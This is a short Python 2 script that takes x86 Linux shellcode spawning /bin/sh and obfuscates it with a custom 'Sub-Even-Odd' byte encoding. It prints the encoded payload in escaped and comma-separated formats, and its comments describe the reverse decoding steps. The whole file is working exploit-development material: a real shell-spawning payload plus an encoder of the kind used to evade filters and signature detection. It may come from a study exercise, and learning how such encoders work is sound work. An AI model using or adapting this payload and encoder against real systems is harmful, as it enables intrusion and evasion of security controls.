#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	y = x - 4
	if (y % 2 == 0):
		y = y + 3
	else:
		y = y - 1

	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' % y

print encoded
print encoded2

print 'Len: %d' % len(bytearray(shellcode))

# Sub-Even-Odd encoding

	# For each unencoded value subtract 4
	# If an unencoded value is even, add 3 to make it odd
	# If an unencoded value is odd, subtract 1 to make it even

	# If an encoded value is even, add 1 to make it odd
	# If an encoded value is odd, subtract 3 to make it even
	# For each encoded value add 4
